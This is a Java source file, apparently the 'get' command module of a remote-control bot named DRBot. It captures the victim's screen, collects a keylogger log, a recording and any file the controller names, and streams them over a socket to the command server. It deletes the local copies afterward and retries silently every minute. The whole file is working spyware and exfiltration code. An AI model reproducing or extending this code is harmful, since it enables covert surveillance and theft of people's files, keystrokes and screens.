package com.DRBot.Commands;


import com.DRBot.SecureLine.SecureLine;
import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.PrintWriter;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.ConnectException;
import java.net.Inet4Address;
import java.net.Socket;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.text.DateFormat;
import java.util.Date;
import javax.imageio.ImageIO;

public class get implements Runnable{
    
    private Socket mySoc;
    private int port;
    private final Inet4Address inetServer;
    private String filePath;
    private String[] fullCommands;
    private final PrintWriter writer;
    private BufferedInputStream buffIn;
    private BufferedOutputStream buffOut;
    private ObjectOutputStream obOut;
    private File fileToTransfer;
    private File rec;
    private final String botName;
    private boolean captureFile = false;
    private boolean sendKeyLogger = false;
    private final Date date = new Date();
    private File keyLoggerFile;
    private boolean recordFile = false;
    private SecureLine secureLine;
    
    
    get(String[] commands,Inet4Address inetServer,PrintWriter writer,String botName,SecureLine secureLine){
        fullCommands = new String[commands.length-1];
        //put the commands in the shitty string array
        for(int i = 1;i<commands.length;i++){
            fullCommands[i-1] = commands[i];
        }//end of the story ... ahahaahahah i'm just kiddin' :0
        this.writer = writer;
        this.inetServer = inetServer;
        this.botName = botName;
        this.secureLine = secureLine;
    }
    get(String portFile,Inet4Address inetServer,PrintWriter writer,String botName,SecureLine secureLine){
        this.inetServer = inetServer;
        this.writer = writer;
        this.botName = botName;
        this.secureLine = secureLine;
        captureFile = true;
        try{
            port = Integer.decode(portFile).intValue();
        }
        catch(NumberFormatException numExe){}
    }
    get(String portFile,Inet4Address inetServer,PrintWriter writer,String botName,String keyLogger,SecureLine secureLine){
        this.keyLoggerFile = new File(date.getDate()+"-"+(date.getMonth()+1)+"-"+(1900+date.getYear()));
        this.inetServer = inetServer;
        this.writer = writer;
        this.botName = botName;
        this.secureLine = secureLine;
        sendKeyLogger = true;
        try{
            port = Integer.decode(portFile).intValue();
        }
        catch(NumberFormatException numExe){}
    }
    get(int portFile,Inet4Address inetServer,PrintWriter writer,String botName,File rec,SecureLine secureLine){
        this.inetServer = inetServer;
        this.writer = writer;
        this.botName = botName;
        this.secureLine = secureLine;
        this.rec = rec;
        recordFile = true;
        port = portFile;
    }
    get(){
        this.keyLoggerFile = new File(date.getDate()+"-"+(date.getMonth()+1)+"-"+(1900+date.getYear()));
     inetServer = null;
     writer = null;
     botName = null;
    }
    
    
    @Override
    public void run(){
        if(captureFile == false && sendKeyLogger == false && recordFile == false){
       try{
           try{
               port = Integer.decode(fullCommands[0]).intValue();
           }
           catch(NumberFormatException numFormat){
                   toPrint("[Get] Found Error in your way of writing.");
           } 
           filePath = fullCommands[1].replace("*",":").replace("\\","\\\\");
           filePath = filePath.replace("_"," ");
           mySoc = new Socket(inetServer,port);
           initBuffers();
       }
       catch(UnknownHostException unKn){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
           toPrint("Unknown Host");
       }
       catch(ConnectException connEx){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
           toPrint("connectException");
       }
       catch(IOException ioExe){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
           toPrint("ioExecp in sending");
       }
        }//brace here
        else //if it's not a file rather than a fucking picture >>>> ;)
            if(captureFile == true){
                try{
                    filePath = makePicture();
                    mySoc = new Socket(inetServer,port);
                    initBuffers();
                    deleteFile();
       }
       catch(UnknownHostException unKn){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
       }
       catch(ConnectException connEx){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
       }
       catch(IOException ioExe){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
       }
                catch(AWTException awtExe){}
            }
       else
                //if to send the logger file.
            if(sendKeyLogger == true){
                try{
           filePath = keyLoggerFile.getPath();
           mySoc = new Socket(inetServer,port);
           initBuffers();
       }
       catch(UnknownHostException unKn){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
       }
       catch(ConnectException connEx){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
       }
       catch(IOException ioExe){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
            }
        }  //end sending a log file.
        else
            if(recordFile == true){
                try{
           filePath = rec.getPath().replace("\\","\\\\");
           mySoc = new Socket(inetServer,port);
           initBuffers();
           rec.delete();
       }
       catch(UnknownHostException unKn){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
       }
       catch(ConnectException connEx){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
       }
       catch(IOException ioExe){
           try{
                Thread.sleep(60000);
                run();
            }
            catch(InterruptedException inter){}
            }
            }
    }
    private synchronized void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
    private synchronized void initBuffers()throws IOException{
        fileToTransfer = new File(filePath);
        if(!fileToTransfer.exists() || fileToTransfer.isDirectory()){
            //fileToTransfer = new File(filePath.replace(" ","_"));
            toPrint("[Get] Can't find the file (or) it's a directory. >> " + fileToTransfer.getPath());
        }
        else
        {
            obOut = new ObjectOutputStream(mySoc.getOutputStream());
            obOut.writeUTF(botName);
            obOut.flush();
            obOut.writeUTF(fileToTransfer.getName());
            obOut.flush();
            
            buffIn = new BufferedInputStream(new FileInputStream(fileToTransfer));
            buffOut = new BufferedOutputStream(mySoc.getOutputStream());
            
            byte[] bufferSize = new byte[(int)fileToTransfer.length()];
            int count;
            while((count = buffIn.read(bufferSize))>0){
                    buffOut.write(bufferSize,0,count);
            }
            
            buffOut.flush();
            obOut.close();
            buffIn.close();
            toPrint("[Get] File is Sent.");
        }
    }
    private synchronized String makePicture()throws AWTException,IOException{
        String picPath = System.getenv("APPDATA").replace("\\","\\\\")+"\\\\"+DateFormat.getDateTimeInstance().format(new Date()).replace(":","-")+".png";
        File pic = new File(picPath);
        BufferedImage buffImage = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));           
        ImageIO.write(buffImage,"png",pic);
        return pic.getPath().replace("\\","\\\\");
    }
    private synchronized void deleteFile()throws IOException{
        Files.delete(fileToTransfer.toPath());
    }
}